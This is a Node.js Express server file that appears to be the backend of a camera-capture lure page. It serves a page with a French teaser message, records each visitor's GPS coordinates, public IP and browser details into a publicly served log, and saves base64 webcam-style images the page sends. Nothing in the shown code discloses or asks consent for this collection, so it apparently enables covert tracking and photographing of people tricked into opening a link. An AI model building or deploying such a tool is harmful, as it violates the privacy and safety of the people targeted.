const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();

// Middleware for parsing JSON and URL-encoded form data
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Serve static files from the 'public' directory
app.use(express.static(path.join(__dirname, 'public')));

// Set the view engine to EJS
app.set('view engine', 'ejs');

// Set the directory for the views (EJS templates)
app.set('views', path.join(__dirname, 'views'));

// Create uploads and images directories if they don't exist
const uploadsDir = path.join(__dirname, 'public', 'uploads');
const imagesDir = path.join(uploadsDir, 'images');

if (!fs.existsSync(uploadsDir)) {
    fs.mkdirSync(uploadsDir, { recursive: true });
    console.log("Uploads directory created.");
}

if (!fs.existsSync(imagesDir)) {
    fs.mkdirSync(imagesDir, { recursive: true });
    console.log("Images directory created.");
}

// Function to generate a random note ID
function generateNoteId() {
    return Math.random().toString(36).substring(2, 10);
}

// Endpoint to render the index2 page (for camera capture)
app.get('/', (req, res) => {
    const noteId = generateNoteId(); // Generate the noteId here
    const noteContent = "Dis moi, tu saurais p?";

    // Render the index2.ejs file with the provided noteId and noteContent
    res.render('index2', { noteId, noteContent });
});

// Endpoint to log client data (geolocation, IP, browser info)
app.post('/log-client-data', (req, res) => {
    const { latitude, longitude, publicIP, browserInfo } = req.body;

    // Validate that all required data is present
    if (!latitude || !longitude || !publicIP || !browserInfo) {
        return res.status(400).json({ message: 'Invalid data' });
    }

    // Create a log entry
    const logEntry = `
Timestamp: ${new Date().toISOString()}
IP: ${publicIP}
Location: (${latitude}, ${longitude})
Browser Info: ${JSON.stringify(browserInfo, null, 2)}

`;

    // Path for the log file
    const logFilePath = path.join(__dirname, 'public', 'uploads', 'log.txt');

    // Append the log entry to the log file
    fs.appendFile(logFilePath, logEntry, (err) => {
        if (err) {
            console.error('Error writing to log file:', err);
            return res.status(500).json({ message: 'Failed to log data' });
        }
        res.json({ message: 'Client data logged successfully' });
    });
});

// Endpoint to handle base64 image data and save it as a file
app.post('/save-image', (req, res) => {
    const { imageData } = req.body;

    // Validate that image data is present
    if (!imageData) {
        return res.status(400).json({ message: 'No image data provided' });
    }

    // Remove the "data:image/png;base64," part from the base64 data
    const base64Data = imageData.replace(/^data:image\/png;base64,/, "");

    // Create a unique filename for the image
    const filename = `image-${Date.now()}.png`;
    const filePath = path.join(imagesDir, filename);

    // Write the image to the file system
    fs.writeFile(filePath, base64Data, 'base64', (err) => {
        if (err) {
            console.error('Error saving the image:', err);
            return res.status(500).json({ message: 'Failed to save image' });
        }
        res.json({ message: 'Image saved successfully', filename });
    });
});

// Start the server and make it listen on all network interfaces (for local access)
const PORT = 3001;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server 2 is running on http://localhost:${PORT}`);
});
